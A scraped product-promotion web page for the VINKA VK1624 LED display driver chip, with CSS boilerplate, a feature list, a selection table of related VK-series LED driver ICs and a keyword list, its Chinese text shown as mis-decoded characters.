h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>VK1624æ˜¯ä¸€ç§æ•°ç ç®¡æˆ–ç‚¹é˜µLEDé©±åŠ¨æ§åˆ¶ä¸“ç”¨èŠ¯ç‰‡ï¼Œå†…éƒ¨é›†æˆæœ‰3çº¿ä¸²è¡Œæ¥å£ã€æ•°æ®é” å­˜å™¨ã€LED é©±åŠ¨ç­‰ç”µè·¯ã€‚SEGè„šæ¥LEDé˜³æï¼ŒGRIDè„šæ¥LEDé˜´æï¼Œå¯æ”¯æŒ 14SEGx4GRIDã€13SEGx5GRIDã€12SEGx6GRIDã€11SEGx7GRIDçš„ç‚¹é˜µLEDæ˜¾ç¤ºé¢æ¿ã€‚é€‚ç”¨ äºè¦æ±‚å¯é ã€ç¨³å®šå’ŒæŠ—å¹²æ‰°èƒ½åŠ›å¼ºçš„äº§å“ã€‚é‡‡ç”¨ SOP24/DIP24 çš„å°è£…å½¢å¼ã€‚LJQ7478</p>
<p>äº§å“å“ç‰Œï¼šæ°¸å˜‰å¾®ç”µ/VINKA<br/>
äº§å“å‹å·ï¼šVK1624</p>
<p>å°è£…å½¢å¼ï¼šSOP24</p>
<p>Â 
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1c256da9a4744a1b36acb102cc02bc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qa06I6yQ0M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070054&amp;x-signature=8HD5%2FSeO5Gc1q%2BrCh1EB4FRXILU%3D" alt="VK1624_V1.3-CN_04.png" loading="lazy"/></p>
<p>ç‰¹ç‚¹</p>
<p>â€¢ å·¥ä½œç”µå‹ 3.0-5.5V</p>
<p>â€¢ å†…ç½® RCæŒ¯è¡å™¨</p>
<p>â€¢ 11ä¸ªSEGè„šï¼Œ4ä¸ªGRIDè„šï¼Œ3ä¸ªå¯é…ç½®SEG/GRIDå¤ç”¨è„š</p>
<p>â€¢ SEGè„šåªèƒ½æ¥LEDé˜³æï¼ŒGRIDè„šåªèƒ½æ¥LEDé˜´æ</p>
<p>â€¢ 3çº¿ä¸²è¡Œæ¥å£</p>
<p>â€¢ 8çº§æ•´ä½“äº®åº¦å¯è°ƒ</p>
<p>â€¢ å†…ç½®æ˜¾ç¤ºRAMä¸º14x8ä½</p>
<p>â€¢ å†…ç½®ä¸Šç”µå¤ä½ç”µè·¯</p>
<p>â€¢ æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>â€¢ å°è£…</p>
<p>SOP24(300mil)(15.40mm x 7.50mm PP=1.27mm).......</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae9e8a22ef464413b8bc9cc33b27940f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qa06I6yQ0M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070054&amp;x-signature=3SEU9s1K4xucUqWfFGVf1hZS7mA%3D" alt="VK1624_V1.3-CN_05.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f154a1554b44cfa8e1e34737dd4591a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qa06I6yQ0M=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769070054&amp;x-signature=YFGKAp9OuHTzYCwTm%2FbI3m1SrWw%3D" alt="VK1624_V1.3-CN_06.png" loading="lazy"/>
<strong>å†…å­˜æ˜ å°„çš„LEDæ§åˆ¶å™¨åŠé©±åŠ¨å™¨</strong>****</p>
<p>VK16D32 Â Â 3.0ï½5.5VÂ Â é©±åŠ¨ç‚¹é˜µï¼š96 Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ12ä½ Â Â å…±é˜³é©±åŠ¨ï¼š--- Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â é™æ€****</p>
<p>ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mAï¼œ10Î¼AÂ Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSSOP24 Â æ’æµé©±åŠ¨</p>
<p>VK16D33 Â Â 3.0ï½5.5VÂ Â é©±åŠ¨ç‚¹é˜µï¼š128 Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ16ä½ Â Â å…±é˜³é©±åŠ¨ï¼š--- Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â é™æ€</p>
<p>ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mAï¼œ10Î¼AÂ Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP28 Â Â æ’æµé©±åŠ¨<br/>
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>VK16K33A Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â å…±é˜´é©±åŠ¨ï¼š16æ®µ8ä½ï¼› å…±é˜³é©±åŠ¨ï¼š8æ®µ16ä½ Â Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â </p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.1mA/1Î¼AÂ Â Â æŒ‰é”®ï¼š13*3 Â Â Â Â å°è£…ï¼šSOP28 Â Â Â é©±åŠ¨ç”µæµå¤§ï¼Œé€‚åˆé«˜äº®æ˜¾ç¤ºåœºåˆ</p>
<p>VK16K33AA Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â å…±é˜´é©±åŠ¨ï¼š16æ®µ8ä½ï¼› å…±é˜³é©±åŠ¨ï¼š8æ®µ16ä½ Â Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â </p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.1mA/1Î¼AÂ Â Â æŒ‰é”®ï¼š13*3 Â Â Â Â å°è£…ï¼šSSOP28 Â Â é©±åŠ¨ç”µæµå¤§ï¼Œé€‚åˆé«˜äº®æ˜¾ç¤ºåœºåˆ</p>
<p>VK16K33B Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š96 Â Â Â å…±é˜´é©±åŠ¨ï¼š12æ®µ8ä½ï¼› å…±é˜³é©±åŠ¨ï¼š8æ®µ12ä½ Â Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â </p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.1mA/1Î¼AÂ Â Â æŒ‰é”®ï¼š10*3 Â Â Â Â å°è£…ï¼šSOP24 Â Â é©±åŠ¨ç”µæµå¤§ï¼Œé€‚åˆé«˜äº®æ˜¾ç¤ºåœºåˆ</p>
<p>VK16K33BA Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š96 Â Â Â å…±é˜´é©±åŠ¨ï¼š12æ®µ8ä½ï¼› å…±é˜³é©±åŠ¨ï¼š8æ®µ12ä½ Â Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â </p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.1mA/1Î¼AÂ Â Â æŒ‰é”®ï¼š10*3 Â Â Â Â å°è£…ï¼šSSOP24 Â é©±åŠ¨ç”µæµå¤§ï¼Œé€‚åˆé«˜äº®æ˜¾ç¤ºåœºåˆ</p>
<p>VK16K33C Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š64 Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ8ä½ï¼› Â å…±é˜³é©±åŠ¨ï¼š8æ®µ8ä½ Â Â Â Â é€šè®¯æ¥å£ï¼šSCL/SDA Â Â </p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.1mA/1Î¼AÂ Â Â æŒ‰é”®ï¼š8*3 Â Â Â Â Â å°è£…ï¼šSOP20 Â Â é©±åŠ¨ç”µæµå¤§ï¼Œé€‚åˆé«˜äº®æ˜¾ç¤ºåœºåˆ</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>VK1640 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ16ä½ Â Â å…±é˜³é©±åŠ¨ï¼š16æ®µ8ä½ Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DIN</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ0.1mA/--Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP28 Â Â </p>
<p>VK1640A Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ16ä½ Â Â å…±é˜³é©±åŠ¨ï¼š16æ®µ8ä½ Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DIN</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ0.1mA/--Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSSOP28</p>
<p>VK1640B Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š96 Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ12ä½ Â Â å…±é˜³é©±åŠ¨ï¼š12æ®µ8ä½ Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DIN</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ0.1mA/--Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSSOP24</p>
<p>VK1650 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š32 Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ4ä½ Â Â å…±é˜³é©±åŠ¨ï¼š4æ®µ8ä½ Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DAT</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼štyp.0.3mA/50Î¼AÂ Â Â æŒ‰é”®ï¼š7*4 Â Â å°è£…ï¼šSOP16/DIP16 Â </p>
<p>VK1Q60 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š32 Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ4ä½ Â Â å…±é˜³é©±åŠ¨ï¼š4æ®µ8ä½ Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DAT</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ0.1mA/---Â Â Â Â Â æŒ‰é”®ï¼š7*4 Â Â å°è£…ï¼šQFN16</p>
<p>VK1651 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š28 Â Â Â å…±é˜´é©±åŠ¨ï¼š4æ®µ7ä½ Â Â å…±é˜³é©±åŠ¨ï¼š7æ®µ4ä½ Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š7*1 Â Â å°è£…ï¼šSOP16/DIP16<br/>
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>VK1637Â Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š48 Â Â Â å…±é˜´é©±åŠ¨ï¼š6æ®µ8ä½ Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ6ä½ Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼š--/-- Â Â Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*2 Â Â å°è£…ï¼šSOP20/DIP20 Â Â Â Â Â Â Â Â Â Â Â Â Â Â </p>
<p>VK1616 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š28 Â Â Â å…±é˜´é©±åŠ¨ï¼š7æ®µ4ä½ Â Â å…±é˜³é©±åŠ¨ï¼š4æ®µ7ä½ Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP16/DIP16 Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1618 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š35/36/35/32 Â Â Â å…±é˜´é©±åŠ¨ï¼š5æ®µ7ä½ï¼›6æ®µ6ä½ï¼›7æ®µ5ä½ï¼›8æ®µ4ä½ Â Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ5ä½ï¼›6æ®µ6ä½ï¼›5æ®µ7ä½ï¼›4æ®µ8ä½ Â Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š5*1 Â Â å°è£…ï¼šSOP18/DIP18 Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1620B Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š48/45/40 Â Â Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ6ä½ï¼›9æ®µ5ä½ï¼›10æ®µ4ä½ Â Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š6æ®µ8ä½ï¼›5æ®µ9ä½ï¼›4æ®µ10ä½ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP20 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1624 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š77/72/65/56 Â Â å…±é˜´é©±åŠ¨ï¼š11æ®µ7ä½ï¼›12æ®µ6ä½ï¼›13æ®µ5ä½ï¼›14æ®µ4ä½ Â Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ11ä½ï¼›6æ®µ12ä½ï¼›5æ®µ13ä½ï¼›4æ®µ14 Â Â Â Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP24/DIP24 Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1S68C Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š70/66/60/52 Â Â å…±é˜´é©±åŠ¨ï¼š10æ®µ7ä½ï¼›11æ®µ6ä½ï¼›12æ®µ5ä½ï¼›13æ®µ4ä½ Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ10ä½ï¼›6æ®µ11ä½ï¼›5æ®µ12ä½ï¼›4æ®µ13ä½ Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š10*2 Â å°è£…ï¼šSSOP24 Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1Q68D Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š70/66/60/52 Â Â å…±é˜´é©±åŠ¨ï¼š10æ®µ7ä½ï¼›11æ®µ6ä½ï¼›12æ®µ5ä½ï¼›13æ®µ4ä½ Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ10ä½ï¼›6æ®µ11ä½ï¼›5æ®µ12ä½ï¼›4æ®µ13ä½ Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š10*2 Â å°è£…ï¼šQFN24 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1668 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š70/66/60/52 Â Â å…±é˜´é©±åŠ¨ï¼š10æ®µ7ä½ï¼›11æ®µ6ä½ï¼›12æ®µ5ä½ï¼›13æ®µ4ä½ Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ10ä½ï¼›6æ®µ11ä½ï¼›5æ®µ12ä½ï¼›4æ®µ13ä½ Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š10*2 Â å°è£…ï¼šSOP24/SSOP24 Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1628 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š70/66/60/52 Â Â å…±é˜´é©±åŠ¨ï¼š10æ®µ7ä½ï¼›11æ®µ6ä½ï¼›12æ®µ5ä½ï¼›13æ®µ4ä½ Â </p>
<p>å…±é˜³é©±åŠ¨ï¼š7æ®µ10ä½ï¼›6æ®µ11ä½ï¼›5æ®µ12ä½ï¼›4æ®µ13ä½ Â Â Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ1mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š10*2 Â å°è£…ï¼šSOP28 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1S38A Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š64 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ8ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*3 Â Â å°è£…ï¼šSSOP24 Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1638 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š80 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š10æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ10ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*3 Â Â å°è£…ï¼šSOP28 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1629 Â Â Â 3.0ï½5.5VÂ Â é©±åŠ¨ç‚¹é˜µï¼š128 Â å…±é˜´é©±åŠ¨ï¼š16æ®µ8ä½ Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ16ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIN/DOUT</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â æŒ‰é”®ï¼š8*4 Â Â å°è£…ï¼šLQFP44(QFP44æ­£æ–¹å½¢)ï¼› Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1629A Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š16æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ16ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP32 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1629B Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š112 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š14æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ14ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*2 Â Â å°è£…ï¼šSOP32 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1629C Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š120 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š15æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ15ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*1 Â Â å°è£…ï¼šSOP32 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK1629D Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š96 Â Â Â Â Â å…±é˜´é©±åŠ¨ï¼š12æ®µ8ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š8æ®µ12ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIO</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ5mA/--Â Â Â Â Â Â Â Â Â æŒ‰é”®ï¼š8*4 Â Â å°è£…ï¼šSOP32 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>VK6932 Â Â Â 3.0ï½5.5VÂ Â Â é©±åŠ¨ç‚¹é˜µï¼š128 Â Â Â Â å…±é˜´é©±åŠ¨ï¼š8æ®µ16ä½ Â Â Â å…±é˜³é©±åŠ¨ï¼š16æ®µ8ä½ Â Â é€šè®¯æ¥å£ï¼šCLK/STB/DIN</p>
<p>é™æ€ç”µæµ/å¾…æœºç”µæµï¼šï¼œ0.1mA/--Â Â Â Â Â Â Â æŒ‰é”®ï¼š--- Â Â å°è£…ï¼šSOP32 Â Â Â Â Â Â Â Â Â Â Â Â æŠ—å¹²æ‰°èƒ½åŠ›å¼º</p>
<p>(æ°¸å˜‰å¾®ç”µ/VINKAåŸå‚-FAEæŠ€æœ¯æ”¯æŒï¼Œä¸»è¥LCDé©±åŠ¨ICï¼› LEDé©±åŠ¨ICï¼› è§¦æ‘¸ICï¼› LDOç¨³å‹ICï¼› æ°´ä½æ£€æµ‹IC)</p>
<p>LEDé©±åŠ¨ã€LEDå±é©±åŠ¨ã€æ•°æ˜¾é©±åŠ¨ICã€LEDèŠ¯ç‰‡ã€LEDé©±åŠ¨å™¨ã€æ•°ç ç®¡æ˜¾ç¤ºé©±åŠ¨ã€LEDæ˜¾ç¤ºé©±åŠ¨ã€LEDæ•°æ˜¾é©±åŠ¨åŸå‚ã€LEDæ•°æ˜¾é©±åŠ¨èŠ¯ç‰‡ã€LEDé©±åŠ¨ICã€ç‚¹é˜µLEDæ˜¾ç¤ºé©±åŠ¨ã€LEDå±é©±åŠ¨ICã€æ•°æ˜¾é©±åŠ¨èŠ¯ç‰‡ã€æ•°ç ç®¡èŠ¯ç‰‡ã€æ•°ç ç®¡é©±åŠ¨ã€æ•°æ˜¾å±é©±åŠ¨ã€æ•°æ˜¾ICã€æ•°æ˜¾èŠ¯ç‰‡ã€æ•°æ˜¾é©±åŠ¨ã€LEDæ•°æ˜¾ICã€æ•°æ˜¾é©±åŠ¨åŸå‚ã€LEDå±é©±åŠ¨èŠ¯ç‰‡ã€LEDæ•°æ˜¾é©±åŠ¨ICã€LEDæ•°æ˜¾é©±åŠ¨ICã€LEDé©±åŠ¨ç”µè·¯ã€æ•°æ˜¾LEDå±é©±åŠ¨ã€LEDæ•°æ˜¾å±é©±åŠ¨ã€LEDæ˜¾ç¤ºå±é©±åŠ¨ã€LEDæ•°ç ç®¡é©±åŠ¨ã€æ•°æ˜¾LEDé©±åŠ¨ã€LEDæ•°æ˜¾é©±åŠ¨ã€æ•°ç ç®¡æ˜¾ç¤ºICã€æ•°ç ç®¡æ˜¾ç¤ºèŠ¯ç‰‡ã€æ•°ç 